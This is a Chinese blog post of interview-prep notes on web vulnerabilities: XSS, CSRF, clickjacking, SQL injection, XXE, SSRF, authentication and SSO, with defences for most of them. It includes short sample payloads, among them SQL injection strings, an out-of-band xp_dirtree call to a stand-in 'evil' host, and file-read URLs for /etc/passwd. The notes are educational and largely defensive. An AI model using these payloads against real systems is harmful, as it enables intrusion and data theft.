<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2023秋招_WEB漏洞原理 | zsky's Blog</title><meta name="keywords" content="秋招,WEB"><meta name="author" content="zsky"><meta name="copyright" content="zsky"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSSXSS类型反射型XSS需要有带有payload的URL，当用户点击此URL时，服务器就会返回带有自己的恶意js的HTML网页 不需要将恶意js链接存在服务器上 存储型XSS将恶意js链接存在服务器上，比如，一个博客的主页，名字存在XSS漏洞，输入一个特殊构造的名字，存储在服务器上，当任意用户去访问这个人的主页的时候，就会返回带有恶意JS的HTML DOM型XSS前面两个都是浏览器返回的HTM">
<meta property="og:type" content="article">
<meta property="og:title" content="2023秋招_WEB漏洞原理">
<meta property="og:url" content="https://zzzzsky.github.io/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/index.html">
<meta property="og:site_name" content="zsky&#39;s Blog">
<meta property="og:description" content="XSSXSS类型反射型XSS需要有带有payload的URL，当用户点击此URL时，服务器就会返回带有自己的恶意js的HTML网页 不需要将恶意js链接存在服务器上 存储型XSS将恶意js链接存在服务器上，比如，一个博客的主页，名字存在XSS漏洞，输入一个特殊构造的名字，存储在服务器上，当任意用户去访问这个人的主页的时候，就会返回带有恶意JS的HTML DOM型XSS前面两个都是浏览器返回的HTM">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dmoe.cc/random.php?jinjiuyinshi_web">
<meta property="article:published_time" content="2023-09-06T05:00:00.000Z">
<meta property="article:modified_time" content="2024-06-17T15:16:47.337Z">
<meta property="article:author" content="zsky">
<meta property="article:tag" content="秋招">
<meta property="article:tag" content="WEB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.dmoe.cc/random.php?jinjiuyinshi_web"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://zzzzsky.github.io/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2023秋招_WEB漏洞原理',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-06-17 23:16:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/background.css"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友联</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?jinjiuyinshi_web')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zsky's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友联</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023秋招_WEB漏洞原理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-06T05:00:00.000Z" title="发表于 2023-09-06 13:00:00">2023-09-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-17T15:16:47.337Z" title="更新于 2024-06-17 23:16:47">2024-06-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%87%91%E4%B9%9D%E9%93%B6%E5%8D%81/">金九银十</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023秋招_WEB漏洞原理"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>需要有带有payload的URL，当用户点击此URL时，服务器就会返回带有自己的恶意js的HTML网页</p>
<p>不需要将恶意js链接存在服务器上</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>将恶意js链接存在服务器上，比如，一个博客的主页，名字存在XSS漏洞，输入一个特殊构造的名字，存储在服务器上，当任意用户去访问这个人的主页的时候，就会返回带有恶意JS的HTML</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>前面两个都是浏览器返回的HTML中就有恶意的js，DOM型XSS不是，他是在渲染的过程中触发的恶意JS，即服务器返回的HTML是一个正常的HTML，只不过里面的某些JS代码在处理DOM的时候有漏洞</p>
<p>‍</p>
<h2 id="XSS攻击payload"><a href="#XSS攻击payload" class="headerlink" title="XSS攻击payload"></a>XSS攻击payload</h2><h3 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h3><p>一般都是获取cookie</p>
<h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>XSS除了获取COOKIE<a href="">，</a>可以从一个信任的网站跳转到另一个网站（前端一模一样），用来钓鱼</p>
<h3 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h3><p>基本都是存储型XSS，比如个人主页上存放恶意JS，当别人点开这个主页后，恶意的JS也会插入到自己的主页中</p>
<p>‍</p>
<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><p>给Cookie设置 httponly属性，这样JS就拿不到COOKIE了</p>
<p>XSS过滤</p>
<p>CSP白名单的形式</p>
<p>‍</p>
<p>‍</p>
<h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><h2 id="CSRF本质"><a href="#CSRF本质" class="headerlink" title="CSRF本质"></a>CSRF本质</h2><p>受害者已经登录了A网站（假设是个社交网站）</p>
<p>诱导受害者发送一个特定的请求，比如关注某某某,<a target="_blank" rel="noopener" href="http://test.com/follow?id=xiaoming">http://test.com/follow?id=xiaoming</a></p>
<p>因为COOKIE也可能会发过去（Cookie的SameSite属性管这一点，设置成LAX会缓解一部分CSRF）</p>
<p>‍</p>
<h2 id="防御CSRF"><a href="#防御CSRF" class="headerlink" title="防御CSRF"></a>防御CSRF</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>考虑到用户体验，这个只能作为一种辅助手段</p>
<p>‍</p>
<h3 id="Referer校验"><a href="#Referer校验" class="headerlink" title="Referer校验"></a>Referer校验</h3><p>这个最常见的应用是防止图片盗链，服务器可以通过 Referer字段来校验是不是合法的请求</p>
<p>但是 如果应用内部本身就有问题的话，就能绕过去，比如头像可以用URL来设置的话，这个URL设置为一个关注某某某的GET请求，就能绕过这种Referer校验</p>
<p>‍</p>
<h3 id="Cookie的SameSite属性"><a href="#Cookie的SameSite属性" class="headerlink" title="Cookie的SameSite属性"></a>Cookie的SameSite属性</h3><p>设置为LAX，可以缓解一部分CSRF，但是通过网站导航跳转啥的依然会携带COOKIE</p>
<p>‍</p>
<h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti-CSRF Token"></a>Anti-CSRF Token</h3><p>CSRF之所以成功 是因为这个HTTP请求的参数攻击者都知道，如果弄一个加密的或者随机的数放在参数里，攻击者不知道，不就可以绕过CSRF了吗</p>
<p>这个随机的值就是token，token可以放在cookie里或者session里</p>
<p>‍</p>
<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>有点像视觉上的CSRF，就是将iframe设置为透明，然后将iframe的z-index设置的高一点，在原始的html里有一个按钮A，这个按钮的位置正好是Iframe关键操作的按钮B，当用户以为点击了按钮A的时候，实际上执行了点击按钮B的操作(iframe就是关键的那个网站，比如淘宝啥的)</p>
<p>‍</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h2 id="Frame-Busting"><a href="#Frame-Busting" class="headerlink" title="Frame Busting"></a>Frame Busting</h2><p>通过JS代码来防止iframe嵌套，比如top.location = self.location，但从逻辑上可能绕过去</p>
<p>‍</p>
<h3 id="Cookie的SameSite属性-1"><a href="#Cookie的SameSite属性-1" class="headerlink" title="Cookie的SameSite属性"></a>Cookie的SameSite属性</h3><p>当cookie的SameSite的属性设置为LAX或者Strict的模式时，通过iframe就不会发送对应的cookie</p>
<p>‍</p>
<h3 id="CSP-frame-ancestors"><a href="#CSP-frame-ancestors" class="headerlink" title="CSP: frame-ancestors"></a>CSP: frame-ancestors</h3><p>CSP中的frame-ancestors的指令用于指示哪些源可以加载当前页面</p>
<p>比如Content-Security-Policy: frame-ancestors ‘self’ <a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a></p>
<p>‍</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入方式"><a href="#SQL注入方式" class="headerlink" title="SQL注入方式"></a>SQL注入方式</h2><h3 id="最常规注入"><a href="#最常规注入" class="headerlink" title="最常规注入"></a>最常规注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- &#x27; AND password = &#x27;password&#x27; </span></span><br></pre></td></tr></table></figure>

<h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><p>联合查询多个表</p>
<p>‍</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>通过;分开执行多条SQL语句</p>
<p>‍</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>如果WEB页面有回显的话，通过报错注入的方式可以得到很多有用的信息，比如UpdateXML和ExtractValue等函数的第二个参数</p>
<p>比如 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, author <span class="keyword">FROM</span> Books <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">123</span> <span class="keyword">and</span> ExtractValue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, database())) <span class="comment">--</span></span><br></pre></td></tr></table></figure>



<p>错误回显为：XPATH syntax error: ‘~database_name’</p>
<p>‍</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>为了探测是否存在SQL注入漏洞</p>
<h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p><a target="_blank" rel="noopener" href="http://test.com/item.php?id">http://test.com/item.php?id</a> = 2 AND 1=2</p>
<p><a target="_blank" rel="noopener" href="http://test.com/item.php?id">http://test.com/item.php?id</a> = 2 AND 1=1</p>
<p>服务器返回的界面可能不一样</p>
<p>‍</p>
<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>123 OR BENCHMARK(500000000, MD5(123)) ;–</p>
<p>根据页面返回的时间来判断是否存在SQL注入</p>
<p>‍</p>
<h3 id="带外数据注入"><a href="#带外数据注入" class="headerlink" title="带外数据注入"></a>带外数据注入</h3><p>如果WEB查询数据库的操作是异步的，则布尔型盲注和延时盲注就寄了</p>
<p>带外数据注入： 通过额外的信道向外发送数据</p>
<p>‍</p>
<p><a target="_blank" rel="noopener" href="http://test.com/item.aspx?id=1;EXEC">http://test.com/item.aspx?id=1;EXEC</a> master..xp_dirtree ‘\\test.evil.site\&#39; –%20</p>
<p>然后它会进行DNS请求，去查询DNS日志就知道有没有SQL注入了</p>
<p>‍</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>又叫存储型SQL注入</p>
<p>自己设计的SQL语句已经想办法存在数据库中了</p>
<p>‍</p>
<p>‍</p>
<h2 id="SQL注入技巧"><a href="#SQL注入技巧" class="headerlink" title="SQL注入技巧"></a>SQL注入技巧</h2><p>利用SQLmap</p>
<p>命令执行</p>
<p>攻击存储过程 xp_cmdshell</p>
<p>编码问题</p>
<p>SQL Column Truncation（长字符串截断）</p>
<p>‍</p>
<h2 id="预防SQL注入"><a href="#预防SQL注入" class="headerlink" title="预防SQL注入"></a>预防SQL注入</h2><h3 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h3><p>SQL注入一般都是SQL语句拼起来的，因为这个过程SQL语句结构发生了改变</p>
<p>使用预编译语句，这种查询方法也叫参数化查询，这种方式可以固定SQL语句的结构</p>
<p>‍</p>
<p>比如String sql = “select * from User where name=? and age = ?”</p>
<p>……</p>
<h3 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h3><p>这种一般是用来处理复杂的数据库操作，但是也可以用来防止SQL注入</p>
<p>‍</p>
<h3 id="参数校验"><a href="#参数校验" class="headerlink" title="参数校验"></a>参数校验</h3><p>比如校验是不是整数之类的</p>
<p>‍</p>
<h3 id="使用安全函数"><a href="#使用安全函数" class="headerlink" title="使用安全函数"></a>使用安全函数</h3><p>比如用mysqli_real_escape_string 而不是addslashes</p>
<p>还有一些WEB开发框架使用DAO来操作数据库，</p>
<p>‍</p>
<p>‍</p>
<h1 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h1><h2 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h2><p>非关系型数据库也存在注入</p>
<p>‍</p>
<h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="XXE外部实体注入"><a href="#XXE外部实体注入" class="headerlink" title="XXE外部实体注入"></a>XXE外部实体注入</h3><p>可以使用ENTITY定义自己的实体</p>
<p>‍</p>
<p>然后可以实现任意文件读取:SYSTEM “file///etc/passwd”</p>
<p>网络协议读取内部服务器的资源（SSRF）SYSTEM “<a target="_blank" rel="noopener" href="http://10.11.11.11/1.txt&quot;">http://10.11.11.11/1.txt&quot;</a></p>
<p>PHP安装了expect模块后，还能实现任意命令执行，比如expect://ifconfig</p>
<p>‍</p>
<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>比如两个回车换行改变HTTP的头和数据，甚至可以写入HTTP头</p>
<p>通过编码即可解决</p>
<p>‍</p>
<h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><p>轻量级目录访问协议，主要用于目录资源的查询</p>
<p>‍</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>服务端请求伪造(Server Side Request Forgery)</p>
<p>WEB应用将外部输入当做URL并访问，攻击者可以构造特殊的URL让服务器端访问指定的URL，该访问行为是服务器预期之外的，这种就叫SSRF攻击。</p>
<p>‍</p>
<h2 id="SSRF漏洞成因"><a href="#SSRF漏洞成因" class="headerlink" title="SSRF漏洞成因"></a>SSRF漏洞成因</h2><ol>
<li>web应用使用网络库获取外部资源或者调用外部接口，比如翻译外部网页（需要输入URL）</li>
<li>XXE外部实体注入</li>
<li>应用程序允许通过外部参数指定配置，比如输入URL作为数据库连接地址等</li>
<li>无头浏览器（暂时不懂）</li>
<li>安全检测发起网络访问，比如如果QQ对用户发的网页进行后台检测，如果是恶意的就标明叹号等</li>
</ol>
<p>‍</p>
<h2 id="SSRF攻击进阶"><a href="#SSRF攻击进阶" class="headerlink" title="SSRF攻击进阶"></a>SSRF攻击进阶</h2><h3 id="访问内网应用"><a href="#访问内网应用" class="headerlink" title="访问内网应用"></a>访问内网应用</h3><p>内网漏洞很多，比如通过简单的<a target="_blank" rel="noopener" href="http://localhost:5984/__users/_all_docs%E5%B0%B1%E8%83%BD%E8%AE%BF%E9%97%AECurchDB%E7%94%A8%E6%88%B7%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE">http://localhost:5984/__users/_all_docs就能访问CurchDB用户表的所有数据</a></p>
<p>‍</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>根据返回结果判断内网域名或IP地址是否存在，端口是否开放等</p>
<p>通过响应内容的信息，长度，状态码和响应时间等信息</p>
<p>‍</p>
<h3 id="攻击非WEB应用"><a href="#攻击非WEB应用" class="headerlink" title="攻击非WEB应用"></a>攻击非WEB应用</h3><p>如果支持file协议或者ftp协议</p>
<p><a target="_blank" rel="noopener" href="http://test.com/vuln.php?url=file:///etc/passwd">http://test.com/vuln.php?url=file:///etc/passwd</a></p>
<p>利用Gopher实现协议走私等</p>
<p>‍</p>
<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p>比如通过黑名单限制了不能访问内网IP</p>
<p>可以通过DNS解析绕过或者自己弄一个服务器重定向到内网</p>
<p>‍</p>
<h2 id="SSRF防御方案"><a href="#SSRF防御方案" class="headerlink" title="SSRF防御方案"></a>SSRF防御方案</h2><ol>
<li>校验协议类型，一般需要访问的目标都是有明确的协议的，可以用白名单的形式校验协议</li>
<li>应用调用的接口如果比较少的话，尽量白名单校验</li>
<li>校验是不是内网IP</li>
<li>在解析用户输入的URL的时候，尽量用库，而不是自己写正则</li>
<li>对用户输入的参数做校验，比如CRLF，dn, passwd等关键字</li>
<li>大部分应用使用HTTP/HTTPS就够了，应当禁用无关协议</li>
<li>修复内网漏洞啥的</li>
<li>应用访问URL后，应当校验返回内容的合法性，就算是错误信息，尽量不要返回给用户</li>
</ol>
<p>‍</p>
<p>总结：尽量用白名单的形式</p>
<p>‍</p>
<h1 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h1><p>‍</p>
<h2 id="身份认证的方式"><a href="#身份认证的方式" class="headerlink" title="身份认证的方式"></a>身份认证的方式</h2><p>HTTP认证（401）</p>
<p>表单登录（最常用的登陆方式）</p>
<p>客户端证书（在企业里常见）</p>
<p>一次性密码（One Time Password,OTP）比如手机验证码</p>
<p>多因素认证，比如登陆了后还需要手机验证码啥的</p>
<p>FIDO（Fast IDentity Online）发布了开放的身份认证标准FIFO，包含2个协议UAF和U2F</p>
<ol>
<li>UAF(Universal Authentication Framework): 比如人脸识别，指纹啥的</li>
<li>U2F(Universal 2nd Factor)：二次认证方案，比如APPLEID登录官网时，不仅需要输入账号密码，它会给对应的设备（我的是ipad）发送一个验证码，还是输入验证码才能登陆成</li>
<li>为了让浏览器支持FIDO，有个WebAuthn规范，U2F-&gt;升级-&gt;CTAP（客户端到认证器协议）允许用户使用指纹或者蓝牙等设备认证，WebAuthn和CTAP一起被称为FIDO2</li>
</ol>
<p>‍</p>
<h2 id="暴力破解和撞库"><a href="#暴力破解和撞库" class="headerlink" title="暴力破解和撞库"></a>暴力破解和撞库</h2><p>暴力破解：一般不是穷举，有个弱密码列表+常用用户名列表。</p>
<p>撞库：一个人可能在不同网站设置同样的密码，所以攻击者获取一个密码后，登陆其它网站也大概率能登录，这种就叫撞库攻击</p>
<p>‍</p>
<h2 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h2><p>‍</p>
<p>单点登录（Single Sign-On, SSO）：同一种方式登录多个平台。</p>
<h3 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h3><p>OAuth: Open Authorization</p>
<p>比如很多网站可以用QQ登录，点击后，会弹出个QQ输入账号密码的框，就是用的这种方式</p>
<p>流程（以QQ登录CSDN举例）：</p>
<ol>
<li>用户登录CSDN，点击QQ的方式</li>
<li>应用返回302:/authorize</li>
<li>用户访问 …qq…/authorize，然后输入账号密码啥的，点击登录</li>
<li>…qq….这个域名返回302，….csdn../callback?code=AUTH_CODE</li>
<li>用户访问….csdn../callback?code=AUTH_CODE 就能登进去了</li>
</ol>
<p>这里容易出现CSRF漏洞，比如攻击者A直接发给别人 …../callback?code=AUTH_CODE 这个网址，对面可能登录攻击者A的账号</p>
<p>‍</p>
<h3 id="OIDC"><a href="#OIDC" class="headerlink" title="OIDC"></a>OIDC</h3><p>OIDC：OpenID Connect</p>
<p>基于OAuth的，流程跟OAuth一样，但是OAuth其实是用授权的方式来进行认证的，OIDC是原生支持身份认证的，Facebook和Twitter在使用OIDC</p>
<p>‍</p>
<h3 id="SAML"><a href="#SAML" class="headerlink" title="SAML"></a>SAML</h3><p>SAML: Security Assertion Markup Language，一种基于XML的数据标准<br>在IdP（身份提供者，比如学校）和SP（服务提供者，比如知网）之间交换信息</p>
<p>流程（以CARSI的形式登录知网为例）</p>
<ol>
<li>用户登录知网，点击CARSI的方式</li>
<li>用户生成SAML认证请求并重定向到IdP(是个…/SSO/Redirect?SAMLRequest=request)</li>
<li>用户访问..edu.cn/…../SSO/Redirect?SAMLRequest=request，返回一个登录界面，让输入账号密码</li>
<li>用户输入账号密码，回车，IdP就返回SAMLResponse，然后浏览器自动POST的方式返回给SP，然后就登录了</li>
</ol>
<p>‍</p>
<h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>CAS：Central Authentication Service</p>
<p>在CAS中，对用户进行身份校验的叫CAS Server，使用单点登录的WEB应用叫CAS  Client</p>
<p>感觉跟上面那个OAuth和SAML差不多，浏览器重定向到CAS Server的过程中，需要提交一个service参数，用于指定登陆成功后功重定向的目标地址（CAS Client的地址）</p>
<p>比如：<a target="_blank" rel="noopener" href="https://server/cas/login?service=http://www.service.com">https://server/cas/login?service=http://www.service.com</a></p>
<p>认证成功后，CAS Server将用户重定向到CAS Client的时候，在参数中传递一个Service Ticket，然后CAS Client基于这个Service Ticket和自己的服务标识从CAS Server中获取用户认证信息。</p>
<p>‍</p>
<p>‍</p>
<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><p>主体对客体拥有的操作权限</p>
<p>‍</p>
<h2 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h2><h3 id="自主访问控制模型"><a href="#自主访问控制模型" class="headerlink" title="自主访问控制模型"></a>自主访问控制模型</h3><p>自主访问控制（Discretionary Access Control）</p>
<p>比如飞书文档的权限控制，文档作者可以控制其他人员对当前文档的访问权限。</p>
<p>‍</p>
